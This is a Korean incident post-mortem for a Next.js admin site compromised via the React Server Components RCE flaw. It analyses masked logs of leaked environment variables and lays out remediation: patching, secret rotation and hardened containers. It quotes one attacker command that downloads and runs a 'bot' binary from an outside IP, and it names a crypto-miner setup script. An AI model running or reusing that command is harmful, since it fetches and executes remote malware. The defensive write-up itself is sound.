@@ -1,0 +1,52 @@
+<div class="mdx-content"><h2 class="scroll-mt-16">1. 사건 개요와 이 기록의 범위</h2>
+<p>2025년 12월 8일 Admin 웹 사이트에 접속했을 때 503 오류를 확인했다. 당시 작성한 기록에는 비정상적인 <code>NEXT_REDIRECT</code> 오류의 <code>digest</code>에 환경변수 문자열이 나타났다고 남겼다. 외부에서 스크립트와 실행 파일을 다운로드·실행하려는 명령이 반복되었다는 내용도 있다.</p>
+<p>이 글은 그 사고 기록을 바탕으로, 로그에서 확인할 수 있는 내용과 취약점 해석을 구분한다. 아래는 기존 글에 공개되어 있던 마스킹된 발췌다.</p>
+<p>이번 수정에서는 전체 원본 로그, 요청 본문, 당시 배포 이미지, 외부 응답을 새로 확보하지 않았다. 따라서 개별 공격 요청의 성공 여부와 외부로 전달된 정보의 전체 범위, 정확한 최초 침투 시점은 확정하지 않는다.</p>
+<h2 class="scroll-mt-16">2. 로그 분석 및 공격 양상</h2>
+<h3 class="scroll-mt-16">오류에 기록된 환경변수 문자열</h3>
+<p>기존 발췌의 시각은 UTC(<code>Z</code>) 기준 2025년 12월 7일이다. 위의 12월 8일은 접속 이상을 확인했다고 기록한 날짜다. 따라서 두 날짜를 같은 사건 시각으로 합쳐서는 안 된다.</p>
+<div class="code"><div class="code-bar"><span>TEXT</span><button class="btn" type="button">Copy</button></div><pre><code class="language-text">2025-12-07T09:43:20.102398141Z  ⨯ [Error: NEXT_REDIRECT] {
+2025-12-07T09:43:20.102432946Z    digest: &#x27;NODE_VERSION=18.20.8\n&#x27; +
+2025-12-07T09:43:20.102461756Z      &#x27;NEXT_PUBLIC_POINT_SERVICE_API_URL=https://api.서비스.com\n&#x27; +
+2025-12-07T09:43:20.102472020Z      &#x27;NEXT_PUBLIC_SERVICE_API_TOKEN=eyJhbGciOiJIUzI1NiIsIn...\n&#x27; + // 민감 정보 유출
+2025-12-07T09:43:20.102547875Z      &#x27;NODE_ENV=production&#x27;
+2025-12-07T09:43:20.102550178Z }
+</code></pre></div>
+<p>위 주석을 포함한 문자열은 기존 글의 발췌다. 주소와 토큰은 이미 마스킹되어 있다.</p>
+<p>이 발췌로 직접 확인할 수 있는 사실은 환경변수 형태의 문자열이 오류의 <code>digest</code>에 기록되었다는 점이다. <code>NEXT_REDIRECT</code> 오류가 항상 환경변수를 유출한다고 볼 근거는 없다. 이 로그만으로 공격자가 받은 HTTP 응답이나 AWS 키·DB 접속 정보까지 확인했다고 단정할 수도 없다.</p>
+<p>원래 기록은 AWS 접근 키, 서비스 API 토큰, DB 정보의 노출을 우려했다. 대응에서는 노출 가능성이 있는 비밀을 찾아 교체해야 한다. 다만 공개된 발췌가 보여 주는 범위와 실제 유출 범위는 구분해야 한다.</p>
+<p>클라이언트에 공개되는 <code>NEXT_PUBLIC_</code> 설정에는 비밀을 넣지 않아야 한다. 이 원칙은 이번 취약점과 별개로 지켜야 한다. <a href="https://nextjs.org/docs/app/guides/environment-variables" target="_blank" rel="noopener noreferrer">Next.js 환경변수 문서<svg xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round" class="lucide lucide-external-link ml-1 h-3 w-3" aria-hidden="true"><path d="M15 3h6v6"></path><path d="M10 14 21 3"></path><path d="M18 13v6a2 2 0 0 1-2 2H5a2 2 0 0 1-2-2V8a2 2 0 0 1 2-2h6"></path></svg></a></p>
+<h3 class="scroll-mt-16">다운로드와 실행 명령의 흔적</h3>
+<p>당시 기록에는 <code>setup_c3pool_miner.sh</code> 다운로드 시도가 남아 있다. 외부 주소에서 <code>bot</code> 파일을 내려받아 실행 권한을 주고 실행하려는 패턴도 있다. 아래는 기존에 공개한 마스킹된 명령 오류 문자열이며 실행 지침이 아니다.</p>
+<div class="code"><div class="code-bar"><span>TEXT</span><button class="btn" type="button">Copy</button></div><pre><code class="language-text">Command failed: cd /tmp; wget http://176.117.xxx.xxx/bot; chmod 777 bot; ./bot || ...
+</code></pre></div>
+<p>기록에는 초기 <code>wget: Operation timed out</code> 실패와 이후 13:03:57에 <code>&#x27;bot&#x27; saved</code>를 보았다는 설명도 있다. 이 시각의 전체 로그와 시간대는 현재 발췌에 없다. 그래서 다른 로그와 정확하게 정렬할 수 없다.</p>
+<p>다운로드 성공 메시지를 보았다는 당시 관찰만으로는 그 파일이 실제 실행되어 계속 동작했다고 결론 내릴 수 없다. 프로세스 실행, 지속성 등록, 외부 통신 여부는 각각 추가 증거가 필요하다.</p>
+<h2 class="scroll-mt-16">3. 취약점 원인: RSC 요청 페이로드 처리 결함</h2>
+<p>CVE-2025-55182는 인증 없이 원격 코드 실행이 가능했던 취약점이다. 결함은 React Server Function 엔드포인트로 들어오는 요청 페이로드를 디코딩·역직렬화하는 과정에 있었다.</p>
+<p>기존 글에서는 이를 힙 오버플로우나 메모리 커럽션으로 표현했다. React 공식 공지에는 그런 설명이 없어 바로잡는다. <a href="https://react.dev/blog/2025/12/03/critical-security-vulnerability-in-react-server-components" target="_blank" rel="noopener noreferrer">React 공식 공지<svg xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round" class="lucide lucide-external-link ml-1 h-3 w-3" aria-hidden="true"><path d="M15 3h6v6"></path><path d="M10 14 21 3"></path><path d="M18 13v6a2 2 0 0 1-2 2H5a2 2 0 0 1-2-2V8a2 2 0 0 1 2-2h6"></path></svg></a></p>
+<p>Next.js의 CVE-2025-66478 공지는 이 React 취약점이 App Router를 쓰는 Next.js 앱에 미치는 영향을 설명한다.</p>
+<p>React 공식 문서는 서버를 사용하지 않는 React 앱을 영향 대상에서 제외한다. RSC를 지원하는 프레임워크·번들러를 사용하지 않는 앱도 마찬가지다. 반대로 앱에서 Server Function을 직접 작성하지 않았다는 이유만으로 안전하다고 단정할 수는 없다. <a href="https://nextjs.org/blog/CVE-2025-66478" target="_blank" rel="noopener noreferrer">Next.js 공식 영향 범위<svg xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round" class="lucide lucide-external-link ml-1 h-3 w-3" aria-hidden="true"><path d="M15 3h6v6"></path><path d="M10 14 21 3"></path><path d="M18 13v6a2 2 0 0 1-2 2H5a2 2 0 0 1-2-2V8a2 2 0 0 1 2-2h6"></path></svg></a></p>
+<p>이 사고의 오류 문자열과 명령 실행 흔적은 RCE 가능성을 조사할 강한 단서다. 그러나 이 글에 있는 발췌만으로 해당 CVE를 이용한 정확한 요청과 실행 경로가 입증되었다고 쓰지는 않는다.</p>
+<p>CVE와 이 사고의 연결을 확정하려면 당시 설치 버전, 공격 요청, 서버 실행 결과를 함께 대조해야 한다.</p>
+<h3 class="scroll-mt-16">컨테이너 도구 유무와 방어 범위</h3>
+<p>기존 기록에 따르면 당시 이미지는 <code>node:18-alpine</code>이었다. <code>curl</code>이 없어 실패했지만 <code>wget</code>으로는 다운로드를 시도할 수 있었다.</p>
+<p>이 내용은 당시 이미지와 로그의 기록이다. 이번 수정에서는 그 배포 이미지를 복원해 재실행하지 않았다.</p>
+<p>도구가 적은 이미지는 공격자가 쓸 수 있는 편의 수단을 줄일 수 있다. 다만 다운로드 도구가 있었다는 사실을 React 취약점의 원인으로 보면 안 된다. 도구를 없애도 애플리케이션 런타임 자체가 파일·네트워크 기능을 쓸 수 있으므로 RCE가 해결되지는 않는다.</p>
+<h2 class="scroll-mt-16">4. 당시 대응과 지금의 대응 기준</h2>
+<h3 class="scroll-mt-16">당시 기록한 조치</h3>
+<p>원래 글에는 Next.js 보안 업데이트를 수행하고 관련 의존성을 점검했다고 기록했다. <code>15.0.5</code>, <code>15.1.9</code>, <code>16.0.7</code>은 당시 공지에 있던 수정 버전의 예시다.</p>
+<p>이 목록만으로는 실제 서비스가 어느 버전으로 배포됐는지 알 수 없다. 배포 완료를 검증하려면 잠금 파일과 배포 산출물의 버전이 일치하는지도 확인해야 한다.</p>
+<p>또한 컨테이너 베이스를 Distroless로 교체하기로 결정했다고 기록했다. 이는 당시 결정의 기록이며, 이 글에서 교체 완료를 입증하지는 않는다.</p>
+<p>일반 Distroless 이미지는 셸과 패키지 관리자를 제외한다. 다만 디버그 이미지 같은 변형이 있으므로 실제 선택한 이미지도 확인해야 한다. <a href="https://github.com/GoogleContainerTools/distroless" target="_blank" rel="noopener noreferrer">Distroless 공식 저장소<svg xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round" class="lucide lucide-external-link ml-1 h-3 w-3" aria-hidden="true"><path d="M15 3h6v6"></path><path d="M10 14 21 3"></path><path d="M18 13v6a2 2 0 0 1-2 2H5a2 2 0 0 1-2-2V8a2 2 0 0 1 2-2h6"></path></svg></a></p>
+<h3 class="scroll-mt-16">현재 적용할 때의 확인 순서</h3>
+<p>이 부분은 2026년 9월 14일 공식 문서를 다시 확인해 정리한 운영 판단 기준이다. 과거 사고 때 아래 절차를 모두 수행했다는 뜻은 아니다.</p>
+<ol>
+<li>실제로 노출된 앱과 버전을 확인한다. 저장소의 선언뿐 아니라 잠금 파일, 실행 이미지, App Router/RSC 사용 여부를 대조한다. 영향받는 앱은 공식 권고에 맞게 패치하고 다시 배포한다.</li>
+<li>2025년 12월 최초 수정 버전에서 멈추지 않는다. 후속 서비스 거부와 소스 코드 노출 취약점 공지가 나왔고, React의 최초 공지에 연결된 업데이트 지침도 2026년 1월 26일까지 수정되어 있다. 현재 사용하는 릴리스 계열의 지원 상태와 최신 보안 공지를 확인해야 한다. <a href="https://nextjs.org/blog/security-update-2025-12-11" target="_blank" rel="noopener noreferrer">Next.js 후속 보안 공지<svg xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round" class="lucide lucide-external-link ml-1 h-3 w-3" aria-hidden="true"><path d="M15 3h6v6"></path><path d="M10 14 21 3"></path><path d="M18 13v6a2 2 0 0 1-2 2H5a2 2 0 0 1-2-2V8a2 2 0 0 1 2-2h6"></path></svg></a></li>
+<li>패치와 재배포 후 비밀을 교체한다. Next.js 공지는 패치한 앱의 비밀 교체도 권고한다. 새 비밀을 넣기 전에 취약한 실행 환경을 제거하고, 서비스별로 노출 가능성이 있는 자격증명과 폐기 여부를 확인한다. 구체적인 교체 완료 여부를 기록해야 &quot;대응 완료&quot;라고 판단할 수 있다.</li>
+<li>로그와 잔존 흔적을 따로 조사한다. 요청, 오류, 프로세스, 파일, 외부 연결을 시간대가 있는 시각으로 연결한다. 비밀을 로그에 다시 복제하지 않고 필요한 증거를 보존한다. 기존 기록만으로 확인되지 않는 항목은 미확인으로 남긴다.</li>
+<li>피해 범위를 줄이는 설정을 검토한다. 최소 권한 실행, 불필요한 셸·도구 제거, 필요한 대상만 허용하는 외부 연결 정책은 패치와 함께 적용할 방어다. 플랫폼의 임시 차단이나 컨테이너 경량화만으로 취약점이 제거되었다고 판단하지 않는다.</li>
+</ol>
+<p>이번 사고 기록에서는 명령 흔적, 파일 수신, 파일 실행, 정보 유출을 각각 따로 증거로 확인해야 한다.</p>
+<p>보안 패치는 신속하게 적용한다. 그와 함께 관찰과 추론을 나눠 기록해 두어야 이후에 사고 원인과 대응 효과를 다시 검토할 수 있다.</p></div>
